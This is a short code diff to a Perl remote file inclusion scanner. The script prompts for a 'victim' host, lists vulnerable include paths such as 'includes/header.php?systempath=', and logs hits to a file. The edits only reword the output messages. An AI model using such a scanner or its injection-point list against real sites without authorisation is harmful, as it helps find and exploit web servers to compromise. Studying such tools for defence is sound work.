@@ -9,10 +9,10 @@ print q(
      Authors - The[Boss] / Haroon Awan
 
 );
-print "Enter Victim: ";
+print "[>] Enter Victim: ";
 $host=<STDIN>;
 chomp($host);
-print "Ok lets scan..\n";
+print "[>] Ok lets scan\n";
 $rfi1="includes/header.php?systempath=";
 $rfi2="Gallery/displayCategory.php?basepath=";
 $rfi3="index.inc.php?PATH_Includes=";
@@ -610,7 +610,7 @@ if ($response->is_success) {
 open(FILE,">>file.txt");
 print FILE "$url2\n";
 close(FILE);
-print "$url2 is vulnz..\n";
+print "[>] $url2 is vulnerable\n";
 }}
 }
 }
